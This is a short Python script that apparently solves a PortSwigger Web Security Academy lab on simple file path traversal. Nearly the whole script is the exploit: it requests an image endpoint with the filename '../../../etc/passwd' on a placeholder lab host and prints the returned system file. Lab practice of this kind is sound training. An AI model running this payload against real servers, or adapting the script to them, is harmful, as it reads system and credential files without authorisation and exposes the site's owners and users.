#File Path Traversal: Simple Case
#https://portswigger.net/web-security/file-path-traversal/lab-simple

import requests

site = "https://yourlab.web-security-academy.net/"

if "https://" in site:
  site = site.rstrip("/").lstrip("https://")

s = requests.Session()

url = f'https://{site}/image?filename=../../../etc/passwd'

print(url)

resp = s.get(url)
print(resp.text)